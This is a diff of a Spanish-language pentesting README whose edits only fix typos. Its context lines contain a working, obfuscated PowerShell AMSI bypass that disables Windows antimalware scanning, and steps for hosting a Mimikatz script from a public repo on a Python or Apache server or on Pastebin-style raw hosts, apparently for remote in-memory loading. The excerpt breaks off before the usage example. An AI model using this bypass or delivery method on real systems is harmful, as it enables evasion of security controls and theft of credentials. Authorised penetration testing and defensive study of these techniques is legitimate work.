@@ -4,12 +4,12 @@
 $a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true)
 ```
 
-# Ejemeplo de uso:
+# Ejemplo de uso:
 
-Guardar en un archivo, este script de Mimikatz del este repo:
+Guardar en un archivo, este script de Mimikatz de este repo:
 https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1
 
-Abres un servidor con Python o Apache y guardas el archivo con cualquier formato hasta en Webhost/Pastebin/Github etc, cualquier servidor con formato Raw
+Abres un servidor con Python o Apache y guardas el archivo con cualquier formato puedes guardar el archivo hasta en Webhost/Pastebin/Github etc, cualquier servidor con formato Raw
 
 # Ejemplo:
 
